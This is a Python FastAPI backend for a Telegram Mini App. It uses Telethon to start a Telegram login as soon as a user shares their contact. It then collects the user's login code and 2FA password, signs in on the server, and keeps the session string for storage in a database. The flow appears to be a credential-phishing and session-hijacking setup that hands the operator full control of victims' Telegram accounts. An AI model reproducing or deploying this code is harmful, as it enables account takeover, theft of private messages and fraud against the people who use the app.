from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from fastapi.middleware.cors import CORSMiddleware
import asyncio
import logging

# Настройка логов
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("API_SERVER")

app = FastAPI()

# Разрешаем CORS для запросов из Mini App
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Хранилище активных клиентов: {user_id: client_instance}
clients = {}

API_ID = 1234567  # ЗАМЕНИТЬ НА СВОЙ
API_HASH = 'your_hash'  # ЗАМЕНИТЬ НА СВОЙ

class AuthRequest(BaseModel):
    phone: str
    user_id: int

class SignInRequest(BaseModel):
    phone: str
    code: str
    phone_code_hash: str
    user_id: int

class PasswordRequest(BaseModel):
    phone: str
    password: str
    user_id: int

@app.post("/api/send_code")
async def send_code(req: AuthRequest):
    """Шаг 1: Запрос кода. Срабатывает сразу после нажатия 'Поделиться контактом'"""
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        # Очищаем старую сессию для этого пользователя, если она была
        if req.user_id in clients:
            try: await clients[req.user_id].disconnect()
            except: pass
        
        result = await client.send_code_request(req.phone)
        clients[req.user_id] = client
        
        logger.info(f"Код успешно отправлен на номер {req.phone}")
        return {
            "success": True, 
            "phone_code_hash": result.phone_code_hash
        }
    except Exception as e:
        logger.error(f"Ошибка при отправке кода на {req.phone}: {e}")
        await client.disconnect()
        return {"success": False, "error": str(e)}

@app.post("/api/signin")
async def signin(req: SignInRequest):
    """Шаг 2: Ввод кода"""
    client = clients.get(req.user_id)
    if not client:
        return {"success": False, "error": "Сессия потеряна. Начните заново."}
    
    try:
        await client.sign_in(req.phone, req.code, phone_code_hash=req.phone_code_hash)
        
        me = await client.get_me()
        session_str = client.session.save()
        
        logger.info(f"Вход выполнен (без 2FA): {me.id}")
        # Тут твоя логика сохранения сессии в БД
        
        return {"success": True, "need_2fa": False}
        
    except errors.SessionPasswordNeededError:
        logger.info(f"Требуется 2FA для {req.phone}")
        return {"success": True, "need_2fa": True}
    except Exception as e:
        logger.error(f"Ошибка входа: {e}")
        return {"success": False, "error": str(e)}

@app.post("/api/signin_2fa")
async def signin_2fa(req: PasswordRequest):
    """Шаг 3: Ввод 2FA"""
    client = clients.get(req.user_id)
    if not client:
        return {"success": False, "error": "Сессия потеряна."}
    
    try:
        await client.sign_in(password=req.password)
        me = await client.get_me()
        session_str = client.session.save()
        
        logger.info(f"Вход выполнен (с 2FA): {me.id}")
        # Тут твоя логика сохранения сессии в БД
        
        return {"success": True}
    except Exception as e:
        logger.error(f"Ошибка 2FA: {e}")
        return {"success": False, "error": str(e)}